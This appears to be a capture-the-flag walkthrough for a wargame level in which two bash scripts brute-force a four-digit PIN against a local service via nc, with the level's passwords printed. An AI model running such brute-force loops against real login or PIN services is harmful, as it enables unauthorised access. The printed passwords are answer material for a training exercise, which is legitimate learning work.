# Level 25:
Let's divide the workload in half run them in 2 terminals
```sh
nano /tmp/bruteforce1.sh
```
```bash
#!/bin/bash
passwd24=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
for i in {0000..4999}; do
    response=$(echo "$passwd24 $i" | nc localhost 30002)
    if ! echo "$response" | grep -q "Wrong"; then
        echo "Correct PIN: $i"
        echo "$response"
        break
    fi
done
```
And:
```sh
nano /tmp/bruteforce2.sh
```
```bash
#!/bin/bash
passwd24=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
for i in {5000..9999}; do
    response=$(echo "$passwd24 $i" | nc localhost 30002)
    if ! echo "$response" | grep -q "Wrong"; then
        echo "Correct PIN: $i"
        echo "$response"
        break
    fi
done
```
Let's not forget to give them permission to be executed,
```sh
chmod +x /tmp/bruteforce1.sh && chmod +x /tmp/bruteforce2.sh
```
And execute them. Now we wait.
```sh
/tmp/bruteforce1.sh
/tmp/bruteforce2.sh
```
After it has received the right Pin, our script should say:
```
Correct PIN: ****
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
```
#### Password
*`p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`*
